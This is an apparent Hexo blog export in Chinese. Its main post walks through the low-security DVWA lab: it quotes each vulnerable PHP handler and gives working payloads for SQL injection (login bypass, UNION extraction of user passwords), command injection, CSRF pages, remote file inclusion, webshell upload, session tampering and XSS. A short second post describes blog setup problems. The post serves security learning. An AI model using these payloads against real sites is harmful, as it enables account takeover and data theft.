{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"黑桃⑨","url":"https://perfect.xyz"},"pages":[{"title":"关于我","date":"2018-07-04T09:17:48.512Z","updated":"2018-07-04T09:17:48.512Z","comments":true,"path":"about/index.html","permalink":"https://perfect.xyz/about/index.html","excerpt":"","text":"建设中—"}],"posts":[{"title":"基于DVWA的web漏洞原理-low","slug":"dvwa-low","date":"2018-07-05T06:28:20.794Z","updated":"2018-07-07T06:12:17.555Z","comments":true,"path":"2018/07/05/dvwa-low/","link":"","permalink":"https://perfect.xyz/2018/07/05/dvwa-low/","excerpt":"php看的我眼睛都瞎了","text":"php看的我眼睛都瞎了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 获取用户名 $user = $_GET[ &apos;username&apos; ]; // 获取密码 $pass = $_GET[ &apos;password&apos; ]; //用md5加密 $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本 $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //判断结果集是否为1 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取数据库中的用户信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器对输入的username与password没有做限制，这就存在sql注入漏洞 关键点在于&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot; 这条语句 当用户输入的username的值为admin’ or ‘1’=’1时，整条语句就会变为&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;这条语句的逻辑为当user为admin或者当1=1时，整条语句为真 然而1=1永远为真，所以整条语句为真 语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 结果就是攻击者不需要知道admin的密码就登录了admin的账号 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; stristr（）函数在php中为忽略大小写 php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 原理也是过滤不严，没有对输入的值进行检查 直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 拼接符号A &amp; B 简单的拼接，AB之间并无制约关系 A &amp;&amp; B A执行成功才会执行B A | B A的输出作为B的输入 A || B A执行失败才会执行B 常用命令ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; CSRF原理CSRF通过伪装来自受信任用户的请求来访问受信任的网站 1.当用户A访问了受信任的网站B 2.在打开B网页没有关闭的情况下又去访问了C 3.C利用A在B中未过期的cookie，发出一些请求代码来访问B 4.这样C就能在A不知情的情况下利用A的身份访问了B 而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 利用方法构造urlhttp://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个url，他的密码就会被改成password 然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 构造攻击页面在自己的服务器上构造一个html页面 &lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/?? password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改 File Inclusion文件包含 核心代码： &lt;?php // 传入选择的参数 $file = $_GET[ &apos;page&apos; ]; ?&gt; 核心代码很简单，由用户选择文件，服务器去包含执行这些文件 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 利用方法构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php服务器会将phpinfo的内容显示在页面上 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php 内容如下 &lt;?php phpinfo (); ?&gt; 构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php即可访问 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 上传的路径和文件名 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件是否能移动到新位置，用于检查文件是否上传成功 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能移动 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以移动 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php //检查验证码是否正确 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏验证码窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos;], $_POST[&apos;g-recaptcha-response&apos;] ); // 检查输入的验证码是否正确 if( !$resp ) { // 输入的验证码错误 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 检查输入的两个新密码是否匹配 if( $pass_new == $pass_conf ) { // 两个密码匹配 $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 两个密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } //当验证码检查通过 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏验证窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 密码匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; reCAPTCHA验证流程客户端的请求验证码的模块先发送请求到google的服务器上 服务器返回验证码 用户发送验证码到网站的服务器 网站服务器将受到的验证码发给google服务器进行核对 绕过修改参数核心代码中，当step验证码通过时，会将step的值从1修改为2 因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 CSRF构造html &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 受害者访问这个页面密码就会被改掉 SQL Injection Sourcesql注入 核心代码: &lt;?php if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_REQUEST[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集中的值 while( $row = mysqli_fetch_assoc( $result ) ) { $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 显示给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了 手工注入的大致流程1.判断注入点可以用2-1、1=1之类的逻辑判断来寻找是否有注入点 2.查询表的列数利用order by来判断列数 Order by num来判断 1′ or 1=1 order by 2 3.联合查询知道列名之后开始联合查询 比如列数为2 Union select version(),database() 4.爆表名1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 5.爆列名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ 6.爆数据1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_GET[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_GET[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors // 获取结果集中的值 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 没有找到用户，返回一个错误页面 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 客户端返回的错误提示 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 这个时候我们就要用到ascii(）和substr（）函数来一个个猜 如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; //获取session id if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { //如果没有session id则将session id设为0 if (!isset ($_SESSION[&apos;last_session_id&apos;])) { $_SESSION[&apos;last_session_id&apos;] = 0; } //累加session id $_SESSION[&apos;last_session_id&apos;]++; $cookie_value = $_SESSION[&apos;last_session_id&apos;]; //向客户端发送一个http cookie setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; session id的原理密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 利用方法由核心代码可知服务器的sessionid是从0开始累加的 当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 按f12打开控制台，在控制台输入 读取：document.cookie; 修改：document.cookie[“Key”]=”值”; PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的 XSS(DOM)XSS漏洞原理xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 绕过DOM型服务器端没有代码 只要在get获取到的参数后面加上js代码就行 http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 结果就是会出现一个弹框，内容为xss 修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了 XSS (Reflected)反射型xss 核心代码: &lt;?php //向客户端发送原始的 HTTP 报头 header (&quot;X-XSS-Protection: 0&quot;); // 检测get中是否有值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 反馈给用户 echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } 原理同DOM型XSS 在框里输入&lt;script&gt;alert(/xss/)&lt;/script&gt;出现弹框 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { //获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化输入的名称，同上 $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 直接在message栏中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;也可以弹窗了在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制","categories":[],"tags":[]},{"title":"搭博客过程中遇到的一些问题","slug":"problem","date":"2018-07-05T03:51:37.336Z","updated":"2018-07-05T05:22:11.141Z","comments":true,"path":"2018/07/05/problem/","link":"","permalink":"https://perfect.xyz/2018/07/05/problem/","excerpt":"求求你不要再404了.jpg","text":"求求你不要再404了.jpg 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到/source这个目录里面Github只会上传/source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 持续更新中~","categories":[],"tags":[]}]}